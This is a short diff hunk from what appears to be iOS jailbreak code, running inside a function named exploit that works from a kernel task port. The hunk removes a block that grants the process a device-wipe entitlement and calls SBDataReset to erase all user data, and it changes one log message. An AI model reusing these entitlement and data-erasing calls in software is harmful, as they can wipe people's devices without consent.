@@ -1437,30 +1437,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
                 LOG("rv: " "%d" "\n", rv);
                 _assert(rv == 1);
             }
-            LOG("Successfully disallowed SpringBoard to show non-default system apps.");
-            
-            // Get entitlements.
-            LOG("Getting entitlements...");
-            PROGRESS("Exploiting... (30/48)", 0, 0);
-            rv = entitleMe("\t<key>platform-application</key>\n"
-                           "\t<true/>\n"
-                           "\t<key>com.apple.springboard.wipedevice</key>\n"
-                           "\t<true/>");
-            LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
-            LOG("Successfully got entitlements.");
-            
-            // Erase user data.
-            
-            LOG("Erasing user data...");
-            PROGRESS("Exploiting... (31/48)", 0, 0);
-            NOTICE("The device will be restarted.", 1);
-            extern int SBDataReset(mach_port_t, int);
-            extern mach_port_t SBSSpringBoardServerPort(void);
-            rv = SBDataReset(SBSSpringBoardServerPort(), 1);
-            LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
-            LOG("Successfully erased user data.");
+            LOG("Successfully allowed SpringBoard to show non-default system apps.");
         }
     }
     
